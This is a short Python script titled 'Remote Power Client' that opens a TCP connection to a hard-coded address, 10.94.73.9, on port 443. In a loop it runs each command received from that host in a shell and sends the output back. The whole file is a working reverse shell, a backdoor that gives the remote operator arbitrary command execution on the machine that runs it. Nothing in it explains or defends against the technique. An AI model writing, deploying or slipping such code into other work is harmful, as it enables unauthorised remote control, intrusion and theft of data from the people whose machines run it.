 ##################################
# Title - Remote Power Client
# Date - 05/09/2017
##################################

import socket
import subprocess as sp
import sys

##########Functions###############


##########Body####################

host = '10.94.73.9'
port = 443

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

while True:
    command = str(client.recv(1024))

    if command != "exit()":
        sh = sp.Popen(command, shell=True,
                      stdout=sp.PIPE,
                      stderr=sp.PIPE,
                      stdin=sp.PIPE)

        out, err = sh.communicate()

        result = str(out) + str(err)

        length = str(len(result)).zfill(16)

        client.send(length + result)
    else:
        break

client.close